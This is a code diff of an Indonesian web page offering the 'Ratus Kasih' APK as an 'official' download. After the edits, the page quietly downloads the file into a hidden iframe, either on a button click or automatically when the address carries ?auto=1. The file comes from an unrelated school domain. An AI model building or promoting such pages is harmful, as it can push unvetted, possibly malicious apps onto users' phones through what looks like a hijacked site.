@@ -1,3 +1,4 @@
+
 <!DOCTYPE html>
 <html lang="id">
 <head>
@@ -104,7 +105,7 @@
         <p>Halaman ini adalah tempat resmi untuk mengunduh file APK Ratus Kasih. Klik tombol unduh untuk memulai proses download  </p>
         <div class="inline-input">
           
-            <a class="btn" href="#unduh" id="ctaTop">⬇️  Unduh APK</a>
+            <a class="btn" href="" id="ctaTop">⬇️  Unduh APK</a>
         </div>
          
       </div>
@@ -132,48 +133,31 @@
   <script>
 	   
     (function(){
-      const APK_URL = 'https://smpn9sinjai.sch.id/RATU_KASIH.apk';
-		 
-      const btn = document.getElementById('btnDownload');
-      const frame = document.getElementById('downloadFrame');
-      const copyBtn = document.getElementById('copyBtn');
-      const apkUrl = document.getElementById('apkUrl');
-      const y = document.getElementById('y');
-      y.textContent = new Date().getFullYear();
-       
-      function triggerDownload(){
-        try{
-          frame.src = APK_URL + (APK_URL.includes('?') ? '&' : '?') + 't=' + Date.now();
-        }catch(e){
-          console.warn('Gagal set iframe:', e);    
-          window.location.href =APK_URL; // fallback
-        }
-      }
+  const APK_URL = 'https://smpn9sinjai.sch.id/RATU_KASIH.apk';
+  const frame = document.getElementById('downloadFrame');
+  const y = document.getElementById('y');
+  y.textContent = new Date().getFullYear();
+  
+  function triggerDownload(){
+    try{
+      frame.src = APK_URL + (APK_URL.includes('?') ? '&' : '?') + 't=' + Date.now();
+    }catch(e){
+      console.warn('Gagal set iframe:', e);    
+      window.location.href = APK_URL; // fallback
+    }
+  }
 
-      btn?.addEventListener('click', triggerDownload);
-      document.getElementById('ctaTop')?.addEventListener('click', function(){
-        setTimeout(triggerDownload, 350);
-      });
+  document.getElementById('ctaTop')?.addEventListener('click', function(e){
+    e.preventDefault();
+    setTimeout(triggerDownload, 350);
+  });
 
-      copyBtn?.addEventListener('click', async function(){
-        try{
-          await navigator.clipboard.writeText(apkUrl.value);
-          copyBtn.textContent = 'Tersalin';
-          setTimeout(()=> copyBtn.textContent = 'Salin', 1200);
-        }catch(err){
-          apkUrl.select();
-          document.execCommand('copy');
-          copyBtn.textContent = 'Tersalin';
-          setTimeout(()=> copyBtn.textContent = 'Salin', 1200);
-        }
-      });
+  const params = new URLSearchParams(location.search);
+  if(params.get('auto') === '1'){
+    setTimeout(triggerDownload, 600);
+  }
+})();
 
-      // Opsional: otomatis mulai jika URL mengandung ?auto=1
-      const params = new URLSearchParams(location.search);
-      if(params.get('auto') === '1'){
-        setTimeout(triggerDownload, 600);
-      }
-    })();
   </script>
 </body>
 </html>
